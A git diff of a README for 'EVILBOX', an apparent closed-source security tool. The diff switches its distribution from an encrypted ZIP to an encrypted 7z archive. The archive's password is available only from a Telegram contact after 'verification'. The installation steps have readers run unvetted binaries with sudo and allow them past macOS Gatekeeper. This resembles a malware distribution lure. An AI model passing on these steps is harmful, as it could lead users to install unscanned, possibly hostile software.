@@ -704,15 +704,15 @@ EVILBOX provides a guided setup flow for teams and researchers who want to run o
 
 | Operating System | Architecture | Binary | Format |
 |:---|:---:|:---:|:---:|
-| Windows 10 / 11 | x86-64 | `EVILBOX.exe` | Inside encrypted ZIP |
-| Debian / Ubuntu 22.04+ | x86-64 | `evilbox.deb` | Inside encrypted ZIP |
-| macOS Intel | x86-64 | `EVILBOX.pkg` | Inside encrypted ZIP |
-| macOS Apple Silicon | ARM64 | `EVILBOX.pkg` | Inside encrypted ZIP |
+| Windows 10 / 11 | x86-64 | `EVILBOX.exe` | Inside encrypted 7z archive |
+| Debian / Ubuntu 22.04+ | x86-64 | `evilbox.deb` | Inside encrypted 7z archive |
+| macOS Intel | x86-64 | `EVILBOX.pkg` | Inside encrypted 7z archive |
+| macOS Apple Silicon | ARM64 | `EVILBOX.pkg` | Inside encrypted 7z archive |
 
-**The encrypted ZIP archive is available in this repository. Contents:**
+**The encrypted 7z archive is available in this repository. Contents:**
 
 ```
-EVILBOX.zip  <── password-protected, available for download in this repository
+EVILBOX.7z  <── password-protected, available for download in this repository
 └── EVILBOX/
     ├── EVILBOX.exe       ← Windows binary
     ├── evilbox.deb       ← Debian/Ubuntu package
@@ -722,7 +722,7 @@ EVILBOX.zip  <── password-protected, available for download in this reposito
     └── LICENSE.txt
 ```
 
-> **The ZIP is publicly downloadable from this repository. The extraction password is not published anywhere.**
+> **The 7z archive is publicly downloadable from this repository. The extraction password is not published anywhere.**
 > All binaries, the license file, and platform installers are sealed inside the encrypted archive.
 > Contact **[@quantumcoders](https://t.me/quantumcoders)** on Telegram after verification to receive the extraction password.
 
@@ -750,14 +750,14 @@ EVILBOX.zip  <── password-protected, available for download in this reposito
 
 ## Installation
 
-> **The ZIP archive is in this repository.** Download it, then contact **@quantumcoders** on Telegram to receive the extraction password after verification. Passwords are never distributed through GitHub Issues, email, Discord, or any other channel.
+> **The 7z archive is in this repository.** Download it, then contact **@quantumcoders** on Telegram to receive the extraction password after verification. Passwords are never distributed through GitHub Issues, email, Discord, or any other channel.
 
 ### Windows
 
 ```powershell
-# 1. Download EVILBOX.zip from this repository
+# 1. Download EVILBOX.7z from this repository
 # 2. Contact @quantumcoders on Telegram — complete verification to receive the password
-# 3. Extract the ZIP using your issued password
+# 3. Extract the 7z archive using your issued password
 # 4. Navigate to the extracted EVILBOX/ folder
 # 5. Launch:
 EVILBOX.exe
@@ -770,9 +770,9 @@ EVILBOX.exe
 ### Debian / Ubuntu
 
 ```bash
-# 1. Download EVILBOX.zip from this repository
+# 1. Download EVILBOX.7z from this repository
 # 2. Contact @quantumcoders on Telegram — complete verification to receive the password
-# 3. Extract the ZIP using your issued password
+# 3. Extract the 7z archive using your issued password
 # 4. Install the Debian package:
 sudo dpkg -i evilbox.deb
 sudo apt --fix-broken install
@@ -785,9 +785,9 @@ evilbox
 ### macOS
 
 ```bash
-# 1. Download EVILBOX.zip from this repository
+# 1. Download EVILBOX.7z from this repository
 # 2. Contact @quantumcoders on Telegram — complete verification to receive the password
-# 3. Extract the ZIP using your issued password
+# 3. Extract the 7z archive using your issued password
 # 4. Double-click EVILBOX.pkg → follow the installation wizard
 # 5. If Gatekeeper prompts you:
 #    System Settings → Privacy & Security → Allow EVILBOX
@@ -946,7 +946,7 @@ EVILBOX includes a built-in secure update mechanism. No reinstall required for f
 
 </div>
 
-- The ZIP archive is available for download in this repository — **binaries, license, and all platform installers are inside**
+- The 7z archive is available for download in this repository — **binaries, license, and all platform installers are inside**
 - The archive is password-protected — the extraction password is **never** published here or on any public channel
 - This repository does **not** contain source code in any form
 - Access to the extraction password requires completing the manual verification protocol via Telegram
@@ -955,7 +955,7 @@ EVILBOX includes a built-in secure update mechanism. No reinstall required for f
 
 ## Access & Verification
 
-The ZIP archive is downloadable from this repository. The extraction password is issued only after manual verification through the official Telegram channel.
+The 7z archive is downloadable from this repository. The extraction password is issued only after manual verification through the official Telegram channel.
 
 **Information typically requested during verification:**
 
@@ -972,11 +972,11 @@ The ZIP archive is downloadable from this repository. The extraction password is
 **Access workflow:**
 
 ```
-Step 1 ──► Download EVILBOX.zip from this repository
+Step 1 ──► Download EVILBOX.7z from this repository
 Step 2 ──► Message @quantumcoders on Telegram
 Step 3 ──► Complete manual verification
 Step 4 ──► Receive approval + unique license credentials
-Step 5 ──► Receive extraction password for the ZIP archive
+Step 5 ──► Receive extraction password for the 7z archive
 Step 6 ──► Extract, install, activate, and access at http://localhost
 ```
 
@@ -988,7 +988,7 @@ Step 6 ──► Extract, install, activate, and access at http://localhost
 
 | Permitted | Prohibited |
 |:---|:---|
-| Install on systems you own or are authorized to assess | Redistribute or mirror the ZIP archive or extracted binaries |
+| Install on systems you own or are authorized to assess | Redistribute or mirror the 7z archive or extracted binaries |
 | Use during authorized penetration tests | Share the extraction password publicly or privately |
 | Use in red team or purple team exercises | Sell, repackage, or publish modified binaries |
 | Use inside security labs and approved environments | Reverse engineer, decompile, or disassemble the application |
